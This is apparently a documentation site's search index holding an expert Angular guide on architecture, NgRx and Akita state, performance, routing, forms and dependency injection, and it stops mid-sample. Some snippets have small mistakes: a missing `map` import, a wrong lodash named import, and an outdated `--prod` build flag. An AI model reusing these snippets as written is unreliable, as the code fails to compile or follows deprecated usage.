{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#hello","title":"HELLO","text":""},{"location":"angular/expert/","title":"Advanced Angular: Expert-Level Best Practices, Optimizations, and Latest Features","text":"<p>Angular is a robust, open-source front-end web application framework maintained by Google. Renowned for its scalability, performance, and comprehensive tooling, Angular empowers developers to build complex, high-performance web applications efficiently. This expert-level guide delves into advanced Angular practices, covering configuration, optimization, security, scalability, and the latest features introduced up to Angular version 16. Whether you're a seasoned Angular developer or looking to deepen your expertise, this guide provides the insights necessary to master Angular's full potential.</p>"},{"location":"angular/expert/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Installation and Initial Setup</li> <li>Advanced Angular Architecture</li> <li>State Management</li> <li>Performance Optimization</li> <li>Routing Strategies</li> <li>Form Handling and Validation</li> <li>Dependency Injection and Providers</li> <li>Change Detection Strategies</li> <li>Advanced Component Design</li> <li>Security Best Practices</li> <li>Testing Strategies</li> <li>Internationalization (i18n) and Localization</li> <li>Progressive Web Apps (PWA) with Angular</li> <li>Angular Universal and Server-Side Rendering (SSR)</li> <li>Latest Features in Angular 16</li> <li>Deployment and Continuous Integration</li> <li>Scalability Strategies</li> <li>Best Practices Summary</li> </ol>"},{"location":"angular/expert/#1-installation-and-initial-setup","title":"1. Installation and Initial Setup","text":""},{"location":"angular/expert/#a-prerequisites","title":"a. Prerequisites","text":"<p>Before installing Angular, ensure you have the following prerequisites:</p> <ul> <li>Node.js and npm: Angular requires Node.js (version 14.15.0 or later) and npm (version 6.0.0 or later).</li> </ul> <p>Installation Check: <pre><code>node -v\nnpm -v\n</code></pre></p> <p>Installation:   Download from Node.js Official Website or use a version manager like <code>nvm</code>.</p> <ul> <li>Angular CLI: A command-line interface tool to initialize, develop, scaffold, and maintain Angular applications.</li> </ul>"},{"location":"angular/expert/#b-installing-angular-cli","title":"b. Installing Angular CLI","text":"<p>Global Installation: <pre><code>npm install -g @angular/cli\n</code></pre></p> <p>Verify Installation: <pre><code>ng version\n</code></pre></p>"},{"location":"angular/expert/#c-creating-a-new-angular-project","title":"c. Creating a New Angular Project","text":"<p>Using Angular CLI: <pre><code>ng new my-advanced-app\n</code></pre></p> <p>Options: - Routing: Include Angular Router. - Stylesheet Format: Choose between CSS, SCSS, SASS, Less, or Stylus.</p> <p>Example: <pre><code>ng new my-advanced-app --routing --style=scss\n</code></pre></p>"},{"location":"angular/expert/#d-project-structure-overview","title":"d. Project Structure Overview","text":"<p>Understanding Angular's project structure is crucial for effective development.</p> <pre><code>my-advanced-app/\n\u251c\u2500\u2500 e2e/                     # End-to-end tests\n\u251c\u2500\u2500 node_modules/            # Project dependencies\n\u251c\u2500\u2500 src/\n\u2502   \u251c\u2500\u2500 app/\n\u2502   \u2502   \u251c\u2500\u2500 components/      # Reusable components\n\u2502   \u2502   \u251c\u2500\u2500 services/        # Services and business logic\n\u2502   \u2502   \u251c\u2500\u2500 models/          # Data models\n\u2502   \u2502   \u251c\u2500\u2500 pages/           # Page-level components\n\u2502   \u2502   \u251c\u2500\u2500 app-routing.module.ts\n\u2502   \u2502   \u2514\u2500\u2500 app.module.ts\n\u2502   \u251c\u2500\u2500 assets/              # Static assets\n\u2502   \u251c\u2500\u2500 environments/        # Environment configurations\n\u2502   \u251c\u2500\u2500 index.html\n\u2502   \u2514\u2500\u2500 main.ts\n\u251c\u2500\u2500 angular.json             # Angular CLI configuration\n\u251c\u2500\u2500 package.json             # Project metadata and dependencies\n\u2514\u2500\u2500 tsconfig.json            # TypeScript configuration\n</code></pre>"},{"location":"angular/expert/#2-advanced-angular-architecture","title":"2. Advanced Angular Architecture","text":""},{"location":"angular/expert/#a-modular-architecture","title":"a. Modular Architecture","text":"<p>Organize the application into feature modules to enhance scalability and maintainability.</p> <p>Benefits: - Lazy Loading: Load modules on demand to reduce initial load time. - Separation of Concerns: Isolate features for better organization. - Reusability: Share modules across different parts of the application or even across projects.</p> <p>Example: Creating a Feature Module: <pre><code>ng generate module user --routing\n</code></pre></p> <p>Module Structure: <pre><code>// user.module.ts\nimport { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { UserRoutingModule } from './user-routing.module';\nimport { UserProfileComponent } from './user-profile/user-profile.component';\n\n@NgModule({\n  declarations: [UserProfileComponent],\n  imports: [\n    CommonModule,\n    UserRoutingModule\n  ]\n})\nexport class UserModule { }\n</code></pre></p>"},{"location":"angular/expert/#b-core-and-shared-modules","title":"b. Core and Shared Modules","text":"<p>Core Module: Contains singleton services and components used once in the application (e.g., navigation bar, footer).</p> <p>Shared Module: Contains reusable components, directives, and pipes used across multiple modules.</p> <p>Example: Creating Core and Shared Modules: <pre><code>ng generate module core\nng generate module shared\n</code></pre></p> <p>Core Module Configuration: <pre><code>// core.module.ts\nimport { NgModule, Optional, SkipSelf } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { HeaderComponent } from './header/header.component';\nimport { FooterComponent } from './footer/footer.component';\n\n@NgModule({\n  declarations: [HeaderComponent, FooterComponent],\n  imports: [CommonModule],\n  exports: [HeaderComponent, FooterComponent]\n})\nexport class CoreModule { \n  constructor(@Optional() @SkipSelf() parentModule: CoreModule) {\n    if (parentModule) {\n      throw new Error('CoreModule is already loaded.');\n    }\n  }\n}\n</code></pre></p> <p>Shared Module Configuration: <pre><code>// shared.module.ts\nimport { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { HighlightDirective } from './directives/highlight.directive';\nimport { TruncatePipe } from './pipes/truncate.pipe';\nimport { FormsModule, ReactiveFormsModule } from '@angular/forms';\n\n@NgModule({\n  declarations: [HighlightDirective, TruncatePipe],\n  imports: [CommonModule, FormsModule, ReactiveFormsModule],\n  exports: [\n    CommonModule,\n    FormsModule,\n    ReactiveFormsModule,\n    HighlightDirective,\n    TruncatePipe\n  ]\n})\nexport class SharedModule { }\n</code></pre></p>"},{"location":"angular/expert/#c-state-management-with-ngrx","title":"c. State Management with NgRx","text":"<p>For complex applications, managing state effectively is crucial. NgRx provides a reactive state management solution inspired by Redux.</p> <p>Installation: <pre><code>ng add @ngrx/store@latest\nng add @ngrx/effects@latest\nng add @ngrx/store-devtools@latest\nng add @ngrx/entity@latest\n</code></pre></p> <p>Example: Setting Up a Counter State: <pre><code>// counter.actions.ts\nimport { createAction } from '@ngrx/store';\n\nexport const increment = createAction('[Counter] Increment');\nexport const decrement = createAction('[Counter] Decrement');\nexport const reset = createAction('[Counter] Reset');\n</code></pre></p> <pre><code>// counter.reducer.ts\nimport { createReducer, on } from '@ngrx/store';\nimport { increment, decrement, reset } from './counter.actions';\n\nexport const initialState = 0;\n\nconst _counterReducer = createReducer(\n  initialState,\n  on(increment, state =&gt; state + 1),\n  on(decrement, state =&gt; state - 1),\n  on(reset, state =&gt; 0)\n);\n\nexport function counterReducer(state, action) {\n  return _counterReducer(state, action);\n}\n</code></pre> <pre><code>// app.module.ts\nimport { StoreModule } from '@ngrx/store';\nimport { counterReducer } from './counter.reducer';\n\n@NgModule({\n  imports: [\n    // ... other imports\n    StoreModule.forRoot({ count: counterReducer }),\n  ],\n  // ... declarations and bootstrap\n})\nexport class AppModule { }\n</code></pre>"},{"location":"angular/expert/#d-reactive-programming-with-rxjs","title":"d. Reactive Programming with RxJS","text":"<p>Leverage RxJS for handling asynchronous data streams, enabling powerful reactive patterns.</p> <p>Best Practices: - Use Operators Wisely: Utilize operators like <code>switchMap</code>, <code>mergeMap</code>, <code>concatMap</code>, and <code>exhaustMap</code> based on the scenario. - Unsubscribe Properly: Prevent memory leaks by unsubscribing from observables when they're no longer needed. - Leverage Subjects and BehaviorSubjects: For multicasting and maintaining state.</p> <p>Example: Using <code>switchMap</code> in a Service: <pre><code>// user.service.ts\nimport { Injectable } from '@angular/core';\nimport { HttpClient } from '@angular/common/http';\nimport { Observable } from 'rxjs';\nimport { switchMap } from 'rxjs/operators';\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class UserService {\n  constructor(private http: HttpClient) {}\n\n  getUserWithPosts(userId: number): Observable&lt;any&gt; {\n    return this.http.get(`/api/users/${userId}`).pipe(\n      switchMap(user =&gt; this.http.get(`/api/users/${userId}/posts`).pipe(\n        map(posts =&gt; ({ ...user, posts }))\n      ))\n    );\n  }\n}\n</code></pre></p>"},{"location":"angular/expert/#3-state-management","title":"3. State Management","text":"<p>Effective state management is critical for maintaining application consistency, especially in large-scale applications. Angular offers multiple state management solutions, with NgRx being one of the most popular.</p>"},{"location":"angular/expert/#a-ngrx-store","title":"a. NgRx Store","text":"<p>Description: A reactive state management library inspired by Redux, providing a unidirectional data flow.</p> <p>Core Concepts: - Actions: Events that describe something that happened. - Reducers: Functions that handle actions and modify the state. - Selectors: Functions to query and derive data from the state. - Effects: Side-effect management for handling asynchronous operations.</p> <p>Example: Managing User State</p> <pre><code>// user.actions.ts\nimport { createAction, props } from '@ngrx/store';\nimport { User } from '../models/user.model';\n\nexport const loadUsers = createAction('[User] Load Users');\nexport const loadUsersSuccess = createAction('[User] Load Users Success', props&lt;{ users: User[] }&gt;());\nexport const loadUsersFailure = createAction('[User] Load Users Failure', props&lt;{ error: any }&gt;());\n</code></pre> <pre><code>// user.reducer.ts\nimport { createReducer, on } from '@ngrx/store';\nimport { loadUsers, loadUsersSuccess, loadUsersFailure } from './user.actions';\nimport { User } from '../models/user.model';\n\nexport interface UserState {\n  users: User[];\n  loading: boolean;\n  error: any;\n}\n\nexport const initialState: UserState = {\n  users: [],\n  loading: false,\n  error: null,\n};\n\nexport const userReducer = createReducer(\n  initialState,\n  on(loadUsers, state =&gt; ({ ...state, loading: true })),\n  on(loadUsersSuccess, (state, { users }) =&gt; ({ ...state, loading: false, users })),\n  on(loadUsersFailure, (state, { error }) =&gt; ({ ...state, loading: false, error }))\n);\n</code></pre> <pre><code>// user.effects.ts\nimport { Injectable } from '@angular/core';\nimport { Actions, createEffect, ofType } from '@ngrx/effects';\nimport { UserService } from '../services/user.service';\nimport { loadUsers, loadUsersSuccess, loadUsersFailure } from './user.actions';\nimport { mergeMap, map, catchError } from 'rxjs/operators';\nimport { of } from 'rxjs';\n\n@Injectable()\nexport class UserEffects {\n  loadUsers$ = createEffect(() =&gt;\n    this.actions$.pipe(\n      ofType(loadUsers),\n      mergeMap(() =&gt; this.userService.getAllUsers()\n        .pipe(\n          map(users =&gt; loadUsersSuccess({ users })),\n          catchError(error =&gt; of(loadUsersFailure({ error })))\n        ))\n    )\n  );\n\n  constructor(\n    private actions$: Actions,\n    private userService: UserService\n  ) {}\n}\n</code></pre> <pre><code>// user.selectors.ts\nimport { createSelector, createFeatureSelector } from '@ngrx/store';\nimport { UserState } from './user.reducer';\n\nexport const selectUserState = createFeatureSelector&lt;UserState&gt;('users');\n\nexport const selectAllUsers = createSelector(\n  selectUserState,\n  (state: UserState) =&gt; state.users\n);\n\nexport const selectUserLoading = createSelector(\n  selectUserState,\n  (state: UserState) =&gt; state.loading\n);\n\nexport const selectUserError = createSelector(\n  selectUserState,\n  (state: UserState) =&gt; state.error\n);\n</code></pre>"},{"location":"angular/expert/#b-akita","title":"b. Akita","text":"<p>Description: A state management pattern built on top of RxJS, emphasizing simplicity and minimal boilerplate.</p> <p>Key Features: - Entity Store: Manages collections of entities. - Selectors and Queries: Efficient data querying. - Plugins: Extend functionality with plugins for persistence, caching, etc.</p> <p>Example: Managing Product State with Akita</p> <pre><code>// product.store.ts\nimport { Injectable } from '@angular/core';\nimport { Store, StoreConfig } from '@datorama/akita';\nimport { Product } from '../models/product.model';\n\nexport interface ProductState {\n  products: Product[];\n}\n\nexport function createInitialState(): ProductState {\n  return {\n    products: []\n  };\n}\n\n@Injectable({ providedIn: 'root' })\n@StoreConfig({ name: 'product' })\nexport class ProductStore extends Store&lt;ProductState&gt; {\n  constructor() {\n    super(createInitialState());\n  }\n}\n</code></pre> <pre><code>// product.query.ts\nimport { Injectable } from '@angular/core';\nimport { Query } from '@datorama/akita';\nimport { ProductState, ProductStore } from './product.store';\nimport { Product } from '../models/product.model';\n\n@Injectable({ providedIn: 'root' })\nexport class ProductQuery extends Query&lt;ProductState&gt; {\n  products$ = this.select(state =&gt; state.products);\n\n  constructor(protected store: ProductStore) {\n    super(store);\n  }\n}\n</code></pre> <pre><code>// product.service.ts\nimport { Injectable } from '@angular/core';\nimport { ProductStore } from './product.store';\nimport { Product } from '../models/product.model';\nimport { HttpClient } from '@angular/common/http';\nimport { tap } from 'rxjs/operators';\n\n@Injectable({ providedIn: 'root' })\nexport class ProductService {\n  constructor(private productStore: ProductStore, private http: HttpClient) {}\n\n  loadProducts() {\n    this.http.get&lt;Product[]&gt;('/api/products').pipe(\n      tap(products =&gt; this.productStore.update({ products }))\n    ).subscribe();\n  }\n}\n</code></pre>"},{"location":"angular/expert/#c-behaviorsubject-and-services","title":"c. BehaviorSubject and Services","text":"<p>For simpler state management needs, leveraging RxJS's <code>BehaviorSubject</code> within Angular services can be effective.</p> <p>Example: Managing Auth State</p> <pre><code>// auth.service.ts\nimport { Injectable } from '@angular/core';\nimport { BehaviorSubject, Observable } from 'rxjs';\nimport { User } from '../models/user.model';\n\n@Injectable({ providedIn: 'root' })\nexport class AuthService {\n  private currentUserSubject: BehaviorSubject&lt;User | null&gt;;\n  public currentUser$: Observable&lt;User | null&gt;;\n\n  constructor() {\n    this.currentUserSubject = new BehaviorSubject&lt;User | null&gt;(null);\n    this.currentUser$ = this.currentUserSubject.asObservable();\n  }\n\n  login(user: User) {\n    // Perform login logic\n    this.currentUserSubject.next(user);\n  }\n\n  logout() {\n    // Perform logout logic\n    this.currentUserSubject.next(null);\n  }\n}\n</code></pre>"},{"location":"angular/expert/#4-performance-optimization","title":"4. Performance Optimization","text":"<p>Optimizing Angular applications ensures smooth user experiences, especially as applications grow in complexity.</p>"},{"location":"angular/expert/#a-ahead-of-time-aot-compilation","title":"a. Ahead-of-Time (AOT) Compilation","text":"<p>Description: Compiles Angular templates during the build phase, reducing the amount of work the browser needs to perform at runtime.</p> <p>Benefits: - Faster Rendering: Minimizes the time taken to render the application. - Smaller Bundle Sizes: Removes unnecessary parts of the framework. - Early Detection of Template Errors: Catches errors during build time.</p> <p>Implementation: <pre><code>ng build --prod --aot\n</code></pre></p>"},{"location":"angular/expert/#b-lazy-loading-modules","title":"b. Lazy Loading Modules","text":"<p>Description: Load feature modules on demand rather than loading all modules upfront, reducing initial load time.</p> <p>Implementation:</p> <p>Defining a Lazy-Loaded Route: <pre><code>// app-routing.module.ts\nconst routes: Routes = [\n  {\n    path: 'user',\n    loadChildren: () =&gt; import('./user/user.module').then(m =&gt; m.UserModule)\n  },\n  // ... other routes\n];\n</code></pre></p>"},{"location":"angular/expert/#c-onpush-change-detection","title":"c. OnPush Change Detection","text":"<p>Description: Optimizes change detection by checking components only when their input properties change or when an event originates from them.</p> <p>Benefits: - Reduced Change Detection Cycles: Enhances performance by limiting unnecessary checks. - Predictable Change Detection: Encourages immutable data patterns.</p> <p>Implementation: <pre><code>@Component({\n  selector: 'app-user-profile',\n  templateUrl: './user-profile.component.html',\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class UserProfileComponent {\n  @Input() user: User;\n}\n</code></pre></p>"},{"location":"angular/expert/#d-trackby-with-ngfor","title":"d. TrackBy with *ngFor","text":"<p>Description: Enhances rendering performance by tracking items in <code>*ngFor</code> loops using a unique identifier.</p> <p>Benefits: - Efficient DOM Updates: Prevents unnecessary re-rendering of list items. - Improved Performance: Especially beneficial for large lists.</p> <p>Implementation: <pre><code>&lt;!-- user-list.component.html --&gt;\n&lt;ul&gt;\n  &lt;li *ngFor=\"let user of users; trackBy: trackById\"&gt;\n    {{ user.name }}\n  &lt;/li&gt;\n&lt;/ul&gt;\n</code></pre></p> <pre><code>// user-list.component.ts\ntrackById(index: number, user: User): number {\n  return user.id;\n}\n</code></pre>"},{"location":"angular/expert/#e-code-splitting-and-bundling","title":"e. Code Splitting and Bundling","text":"<p>Description: Break down the application into smaller bundles, loading only the necessary code for each route or feature.</p> <p>Benefits: - Reduced Initial Load Time: Faster application startup. - Optimized Resource Usage: Load resources as needed.</p> <p>Implementation: Angular CLI handles code splitting automatically when using lazy loading.</p>"},{"location":"angular/expert/#f-tree-shaking","title":"f. Tree Shaking","text":"<p>Description: Removes unused code during the build process, reducing bundle sizes.</p> <p>Benefits: - Smaller Bundle Sizes: Faster load times and reduced bandwidth usage. - Improved Performance: Less code to parse and execute.</p> <p>Implementation: Ensure that imports are specific and avoid importing entire libraries.</p> <p>Example: <pre><code>// Instead of importing the entire library\nimport * as _ from 'lodash';\n\n// Import only the necessary functions\nimport { debounce } from 'lodash/debounce';\n</code></pre></p>"},{"location":"angular/expert/#g-service-workers-and-pwa","title":"g. Service Workers and PWA","text":"<p>Description: Use service workers to cache assets and API responses, enabling offline capabilities and faster load times.</p> <p>Implementation: <pre><code>ng add @angular/pwa\n</code></pre></p> <p>Configuration: Customize the <code>ngsw-config.json</code> file to define caching strategies.</p>"},{"location":"angular/expert/#5-routing-strategies","title":"5. Routing Strategies","text":"<p>Efficient routing is essential for navigation and performance in Angular applications.</p>"},{"location":"angular/expert/#a-nested-routes","title":"a. Nested Routes","text":"<p>Description: Define routes within feature modules to create a hierarchical navigation structure.</p> <p>Example: <pre><code>// user-routing.module.ts\nconst routes: Routes = [\n  {\n    path: '',\n    component: UserComponent,\n    children: [\n      { path: 'profile', component: UserProfileComponent },\n      { path: 'settings', component: UserSettingsComponent }\n    ]\n  }\n];\n</code></pre></p>"},{"location":"angular/expert/#b-route-guards","title":"b. Route Guards","text":"<p>Description: Protect routes by implementing guard services that determine access based on conditions like authentication or authorization.</p> <p>Types of Guards: - CanActivate: Determines if a route can be activated. - CanActivateChild: Determines if child routes can be activated. - CanDeactivate: Determines if a route can be deactivated. - Resolve: Fetches data before a route is activated.</p> <p>Example: Implementing an Auth Guard <pre><code>// auth.guard.ts\nimport { Injectable } from '@angular/core';\nimport { CanActivate, Router } from '@angular/router';\nimport { AuthService } from './auth.service';\nimport { Observable } from 'rxjs';\nimport { map, take } from 'rxjs/operators';\n\n@Injectable({ providedIn: 'root' })\nexport class AuthGuard implements CanActivate {\n  constructor(private auth: AuthService, private router: Router) {}\n\n  canActivate(): Observable&lt;boolean&gt; {\n    return this.auth.isLoggedIn$.pipe(\n      take(1),\n      map(isLoggedIn =&gt; {\n        if (!isLoggedIn) {\n          this.router.navigate(['/login']);\n          return false;\n        }\n        return true;\n      })\n    );\n  }\n}\n</code></pre></p> <p>Applying the Guard: <pre><code>// app-routing.module.ts\nconst routes: Routes = [\n  {\n    path: 'dashboard',\n    component: DashboardComponent,\n    canActivate: [AuthGuard]\n  },\n  // ... other routes\n];\n</code></pre></p>"},{"location":"angular/expert/#c-preloading-strategies","title":"c. Preloading Strategies","text":"<p>Description: Preload lazy-loaded modules in the background after the initial load, improving navigation speed.</p> <p>Built-in Strategies: - No Preloading: Default behavior, modules are loaded on demand. - PreloadAllModules: Preloads all lazy-loaded modules.</p> <p>Custom Preloading: Implement custom logic to decide which modules to preload based on criteria like user behavior.</p> <p>Example: <pre><code>// selective-preloading.strategy.ts\nimport { PreloadingStrategy, Route } from '@angular/router';\nimport { Observable, of } from 'rxjs';\n\nexport class SelectivePreloadingStrategy implements PreloadingStrategy {\n  preload(route: Route, load: Function): Observable&lt;any&gt; {\n    return route.data &amp;&amp; route.data['preload'] ? load() : of(null);\n  }\n}\n</code></pre></p> <p>Applying the Custom Strategy: <pre><code>// app-routing.module.ts\n@NgModule({\n  imports: [RouterModule.forRoot(routes, { preloadingStrategy: SelectivePreloadingStrategy })],\n  providers: [SelectivePreloadingStrategy],\n  exports: [RouterModule]\n})\nexport class AppRoutingModule { }\n</code></pre></p> <p>Marking Routes for Preloading: <pre><code>const routes: Routes = [\n  {\n    path: 'feature',\n    loadChildren: () =&gt; import('./feature/feature.module').then(m =&gt; m.FeatureModule),\n    data: { preload: true }\n  },\n  // ... other routes\n];\n</code></pre></p>"},{"location":"angular/expert/#d-route-resolvers","title":"d. Route Resolvers","text":"<p>Description: Fetch necessary data before a route is activated, ensuring that components have the required data upon initialization.</p> <p>Example: <pre><code>// user-resolver.service.ts\nimport { Injectable } from '@angular/core';\nimport { Resolve, ActivatedRouteSnapshot } from '@angular/router';\nimport { UserService } from './user.service';\nimport { Observable } from 'rxjs';\nimport { User } from '../models/user.model';\n\n@Injectable({ providedIn: 'root' })\nexport class UserResolver implements Resolve&lt;User&gt; {\n  constructor(private userService: UserService) {}\n\n  resolve(route: ActivatedRouteSnapshot): Observable&lt;User&gt; {\n    const userId = route.paramMap.get('id');\n    return this.userService.getUserById(+userId);\n  }\n}\n</code></pre></p> <p>Applying the Resolver: <pre><code>// user-routing.module.ts\nconst routes: Routes = [\n  {\n    path: ':id',\n    component: UserDetailComponent,\n    resolve: { user: UserResolver }\n  }\n];\n</code></pre></p> <p>Accessing Resolved Data: <pre><code>// user-detail.component.ts\nimport { Component, OnInit } from '@angular/core';\nimport { ActivatedRoute } from '@angular/router';\nimport { User } from '../models/user.model';\n\n@Component({\n  selector: 'app-user-detail',\n  template: `&lt;div&gt;{{ user.name }}&lt;/div&gt;`\n})\nexport class UserDetailComponent implements OnInit {\n  user: User;\n\n  constructor(private route: ActivatedRoute) {}\n\n  ngOnInit() {\n    this.user = this.route.snapshot.data['user'];\n  }\n}\n</code></pre></p>"},{"location":"angular/expert/#6-form-handling-and-validation","title":"6. Form Handling and Validation","text":"<p>Angular provides powerful tools for building and validating forms, ensuring data integrity and enhancing user experience.</p>"},{"location":"angular/expert/#a-template-driven-forms-vs-reactive-forms","title":"a. Template-Driven Forms vs. Reactive Forms","text":"<p>Template-Driven Forms: - Pros: Simpler syntax, suitable for simple forms. - Cons: Less scalable, harder to test.</p> <p>Reactive Forms: - Pros: Greater control, scalability, easier testing. - Cons: More verbose syntax.</p> <p>Recommendation: Use Reactive Forms for complex, dynamic forms requiring extensive validation and state management.</p>"},{"location":"angular/expert/#b-reactive-forms","title":"b. Reactive Forms","text":"<p>Creating a Reactive Form: <pre><code>// login.component.ts\nimport { Component, OnInit } from '@angular/core';\nimport { FormGroup, FormBuilder, Validators } from '@angular/forms';\n\n@Component({\n  selector: 'app-login',\n  templateUrl: './login.component.html'\n})\nexport class LoginComponent implements OnInit {\n  loginForm: FormGroup;\n\n  constructor(private fb: FormBuilder) {}\n\n  ngOnInit() {\n    this.loginForm = this.fb.group({\n      email: ['', [Validators.required, Validators.email]],\n      password: ['', [Validators.required, Validators.minLength(8)]]\n    });\n  }\n\n  onSubmit() {\n    if (this.loginForm.valid) {\n      // Handle login\n    }\n  }\n}\n</code></pre></p> <p>Template: <pre><code>&lt;!-- login.component.html --&gt;\n&lt;form [formGroup]=\"loginForm\" (ngSubmit)=\"onSubmit()\"&gt;\n  &lt;label&gt;Email:&lt;/label&gt;\n  &lt;input formControlName=\"email\" type=\"email\" /&gt;\n  &lt;div *ngIf=\"loginForm.get('email').invalid &amp;&amp; loginForm.get('email').touched\"&gt;\n    Invalid email.\n  &lt;/div&gt;\n\n  &lt;label&gt;Password:&lt;/label&gt;\n  &lt;input formControlName=\"password\" type=\"password\" /&gt;\n  &lt;div *ngIf=\"loginForm.get('password').invalid &amp;&amp; loginForm.get('password').touched\"&gt;\n    Password must be at least 8 characters.\n  &lt;/div&gt;\n\n  &lt;button type=\"submit\" [disabled]=\"loginForm.invalid\"&gt;Login&lt;/button&gt;\n&lt;/form&gt;\n</code></pre></p>"},{"location":"angular/expert/#c-custom-validators","title":"c. Custom Validators","text":"<p>Creating a Custom Validator: <pre><code>// validators/password-strength.validator.ts\nimport { AbstractControl, ValidationErrors, ValidatorFn } from '@angular/forms';\n\nexport function passwordStrength(): ValidatorFn {\n  return (control: AbstractControl): ValidationErrors | null =&gt; {\n    const value = control.value;\n\n    if (!value) {\n      return null;\n    }\n\n    const hasUpperCase = /[A-Z]+/.test(value);\n    const hasLowerCase = /[a-z]+/.test(value);\n    const hasNumeric = /[0-9]+/.test(value);\n    const hasSpecial = /[\\W_]+/.test(value);\n\n    const passwordValid = hasUpperCase &amp;&amp; hasLowerCase &amp;&amp; hasNumeric &amp;&amp; hasSpecial;\n\n    return !passwordValid ? { passwordStrength: true } : null;\n  };\n}\n</code></pre></p> <p>Applying the Custom Validator: <pre><code>// register.component.ts\nimport { Component, OnInit } from '@angular/core';\nimport { FormGroup, FormBuilder, Validators } from '@angular/forms';\nimport { passwordStrength } from '../validators/password-strength.validator';\n\n@Component({\n  selector: 'app-register',\n  templateUrl: './register.component.html'\n})\nexport class RegisterComponent implements OnInit {\n  registerForm: FormGroup;\n\n  constructor(private fb: FormBuilder) {}\n\n  ngOnInit() {\n    this.registerForm = this.fb.group({\n      username: ['', Validators.required],\n      password: ['', [Validators.required, passwordStrength()]]\n    });\n  }\n\n  onSubmit() {\n    if (this.registerForm.valid) {\n      // Handle registration\n    }\n  }\n}\n</code></pre></p> <p>Template: <pre><code>&lt;!-- register.component.html --&gt;\n&lt;form [formGroup]=\"registerForm\" (ngSubmit)=\"onSubmit()\"&gt;\n  &lt;label&gt;Username:&lt;/label&gt;\n  &lt;input formControlName=\"username\" type=\"text\" /&gt;\n  &lt;div *ngIf=\"registerForm.get('username').invalid &amp;&amp; registerForm.get('username').touched\"&gt;\n    Username is required.\n  &lt;/div&gt;\n\n  &lt;label&gt;Password:&lt;/label&gt;\n  &lt;input formControlName=\"password\" type=\"password\" /&gt;\n  &lt;div *ngIf=\"registerForm.get('password').errors?.passwordStrength &amp;&amp; registerForm.get('password').touched\"&gt;\n    Password must include uppercase, lowercase, number, and special character.\n  &lt;/div&gt;\n\n  &lt;button type=\"submit\" [disabled]=\"registerForm.invalid\"&gt;Register&lt;/button&gt;\n&lt;/form&gt;\n</code></pre></p>"},{"location":"angular/expert/#d-dynamic-forms","title":"d. Dynamic Forms","text":"<p>Description: Forms that change dynamically based on user interactions or data.</p> <p>Example: Adding Form Controls Dynamically <pre><code>// dynamic-form.component.ts\nimport { Component, OnInit } from '@angular/core';\nimport { FormGroup, FormBuilder, FormArray, Validators } from '@angular/forms';\n\n@Component({\n  selector: 'app-dynamic-form',\n  templateUrl: './dynamic-form.component.html'\n})\nexport class DynamicFormComponent implements OnInit {\n  form: FormGroup;\n\n  constructor(private fb: FormBuilder) {}\n\n  ngOnInit() {\n    this.form = this.fb.group({\n      items: this.fb.array([])\n    });\n  }\n\n  get items() {\n    return this.form.get('items') as FormArray;\n  }\n\n  addItem() {\n    this.items.push(this.fb.group({\n      name: ['', Validators.required],\n      quantity: [1, [Validators.required, Validators.min(1)]]\n    }));\n  }\n\n  removeItem(index: number) {\n    this.items.removeAt(index);\n  }\n\n  onSubmit() {\n    if (this.form.valid) {\n      // Handle form submission\n    }\n  }\n}\n</code></pre></p> <p>Template: <pre><code>&lt;!-- dynamic-form.component.html --&gt;\n&lt;form [formGroup]=\"form\" (ngSubmit)=\"onSubmit()\"&gt;\n  &lt;div formArrayName=\"items\"&gt;\n    &lt;div *ngFor=\"let item of items.controls; let i = index\" [formGroupName]=\"i\"&gt;\n      &lt;label&gt;Name:&lt;/label&gt;\n      &lt;input formControlName=\"name\" type=\"text\" /&gt;\n      &lt;label&gt;Quantity:&lt;/label&gt;\n      &lt;input formControlName=\"quantity\" type=\"number\" /&gt;\n      &lt;button type=\"button\" (click)=\"removeItem(i)\"&gt;Remove&lt;/button&gt;\n      &lt;div *ngIf=\"item.invalid &amp;&amp; item.touched\"&gt;\n        All fields are required with valid values.\n      &lt;/div&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n  &lt;button type=\"button\" (click)=\"addItem()\"&gt;Add Item&lt;/button&gt;\n  &lt;button type=\"submit\" [disabled]=\"form.invalid\"&gt;Submit&lt;/button&gt;\n&lt;/form&gt;\n</code></pre></p>"},{"location":"angular/expert/#7-dependency-injection-and-providers","title":"7. Dependency Injection and Providers","text":"<p>Angular's Dependency Injection (DI) framework provides a powerful mechanism for managing dependencies, enhancing modularity, and facilitating testing.</p>"},{"location":"angular/expert/#a-understanding-providers","title":"a. Understanding Providers","text":"<p>Description: Providers determine how Angular injects dependencies into components and services.</p> <p>Types of Providers: - Class Providers: Provide dependencies by instantiating a class. - Value Providers: Provide dependencies by using a static value. - Factory Providers: Provide dependencies by invoking a factory function. - Existing Providers: Alias one dependency to another.</p>"},{"location":"angular/expert/#b-hierarchical-injectors","title":"b. Hierarchical Injectors","text":"<p>Description: Angular's DI system uses a hierarchical injector structure, allowing different parts of the application to have different instances of services.</p> <p>Levels: - Root Injector: Singleton services available throughout the application. - Module Injector: Services scoped to a specific module. - Component Injector: Services scoped to a specific component and its children.</p> <p>Example: Providing a Service at the Component Level <pre><code>// parent.component.ts\n@Component({\n  selector: 'app-parent',\n  template: `&lt;app-child&gt;&lt;/app-child&gt;`,\n  providers: [ParentService]\n})\nexport class ParentComponent { }\n</code></pre></p> <pre><code>// child.component.ts\n@Component({\n  selector: 'app-child',\n  template: `Child Component`\n})\nexport class ChildComponent {\n  constructor(private parentService: ParentService) {}\n}\n</code></pre>"},{"location":"angular/expert/#c-multi-providers","title":"c. Multi-Providers","text":"<p>Description: Allow multiple values or instances to be associated with a single token.</p> <p>Use Case: Registering multiple handlers or plugins.</p> <p>Example: <pre><code>// notification.service.ts\nexport abstract class NotificationHandler {\n  abstract send(message: string): void;\n}\n</code></pre></p> <pre><code>// email-notification.handler.ts\n@Injectable()\nexport class EmailNotificationHandler extends NotificationHandler {\n  send(message: string) {\n    // Send email\n  }\n}\n</code></pre> <pre><code>// sms-notification.handler.ts\n@Injectable()\nexport class SmsNotificationHandler extends NotificationHandler {\n  send(message: string) {\n    // Send SMS\n  